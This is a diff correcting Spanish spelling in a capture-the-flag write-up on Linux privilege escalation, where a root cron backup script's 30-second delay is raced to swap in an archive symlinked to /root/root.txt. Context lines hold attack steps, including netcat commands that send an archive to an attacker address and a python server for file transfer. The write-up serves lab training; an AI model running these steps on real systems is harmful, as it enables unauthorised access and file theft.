@@ -1,4 +1,4 @@
-## Privilege Escalation {-}
+## Escalada de privilegios {-}
 
 ### Rootear la maquina {-}
 
@@ -8,8 +8,8 @@ id
 sudo -l
 ```
 
-Aqui vemos que no podemos hacer nada y que no tenemos possiblidad de rootear la maquina por vulnerabilidades del proprio usuario.
-Tenemos que enumerar el systema.
+Aqui vemos que no podemos hacer nada y que no tenemos posiblidad de rootear la maquina por vulnerabilidades del propio usuario.
+Tenemos que enumerar el sistema.
 
 ```bash
 uname -a
@@ -22,7 +22,7 @@ ls /var/spool/cron/
 ls /var/spool/cron/ -l
 ```
 
-Bueno aqui no se ve nada, no tenemos permissios SUID no hay nada vemos tareas cron. Pero siempre se puede ver de forma alternativa si hay tareas 
+Bueno aqui no se ve nada, no tenemos permisos SUID no hay nada vemos tareas cron. Pero siempre se puede ver de forma alternativa si hay tareas 
 que se ejecutan a intervalo regular de tiempo.
 
 ```bash
@@ -32,7 +32,7 @@ chmod +x procmon.sh
 nano procmon.sh
 ```
 
-Aqui nos creamos el script que nos servira de monitoring de processos.
+Aqui nos creamos el script que nos servira de monitoreo de procesos.
 
 ```bash
 #!/bin/bash
@@ -46,7 +46,7 @@ while true; do
 done
 ```
 
-Ya podemos ver que hay una tarrea `/bin/bash /usr/sbin/backuperer` que se ejecuta a interval regular de tiempo. lo Analizamos.
+Ya podemos ver que hay una tarea `/bin/bash /usr/sbin/backuperer` que se ejecuta a intervalos regulares de tiempo. lo Analizamos.
 
 ```bash
 cat /usr/sbin/backuperer
@@ -64,7 +64,7 @@ Aqui vemos un script que:
 1. si hay differencias, reporta los cambios en el fichero `/var/backup/onuma_backup_error.txt`
 
 La vulnerabilidad de este script reside en el sleep de 30 secundos que nos permitiria borrar el fichero comprimido `.<hash>` y meter
-otro comprimido. Como supponemos que es **root** que ejecuta la tarea, podemos approvechar de esto para ver la flag de root.
+otro comprimido. Como suponemos que es **root** que ejecuta la tarea, podemos aprovechar de esto para ver la flag de root.
 
 #### Modificacion del comprimido {-}
 
@@ -75,7 +75,7 @@ otro comprimido. Como supponemos que es **root** que ejecuta la tarea, podemos a
     tar -zcvf comprimido.tar /var/www/html
     ```
 
-1. Preparamos en la maquina de attackante para recivir el comprimido
+1. Preparamos en la maquina de atacante para recibir el comprimido
 
     ```bash
     nc -nlvp 443 > comprimido.tar
@@ -87,7 +87,7 @@ otro comprimido. Como supponemos que es **root** que ejecuta la tarea, podemos a
     nc 10.10.14.8 443 < comprimido.tar
     ```
 
-Ahora que tenemos el comprimido en la maquina de attackante, vamos a cambiar su contenido
+Ahora que tenemos el comprimido en la maquina de atacante, vamos a cambiar su contenido
 
 1. descomprimimos el ficher `.tar`
 
@@ -103,7 +103,7 @@ Ahora que tenemos el comprimido en la maquina de attackante, vamos a cambiar su 
     ln -s -f /root/root.txt index.html
     ```
 
-1. creamos un nuevo comprimide
+1. creamos un nuevo comprimido
 
     ```bash
     cd ../../..
@@ -112,7 +112,7 @@ Ahora que tenemos el comprimido en la maquina de attackante, vamos a cambiar su 
 
 1. enviamos el comprimido a la maquina victima
 
-    - en la maquina de attackante
+    - en la maquina de atacante
 
         ```bash
         python3 -m http.server 80
@@ -155,7 +155,7 @@ Ahora que tenemos el comprimido en la maquina de attackante, vamos a cambiar su 
     ./tehijackeolavida.sh
     ```
 
-Cuando la pantalla nos muestre el mensaje `[+] Archivo hijackeado con exito`, podemos mirrar el fichero `/var/backup/onuma_backup_error.txt` 
+Cuando la pantalla nos muestre el mensaje `[+] Archivo hijackeado con exito`, podemos mirar el fichero `/var/backup/onuma_backup_error.txt` 
 y 30 segundos mas tarde tendriamos que ver la flag.
 
 ```bash
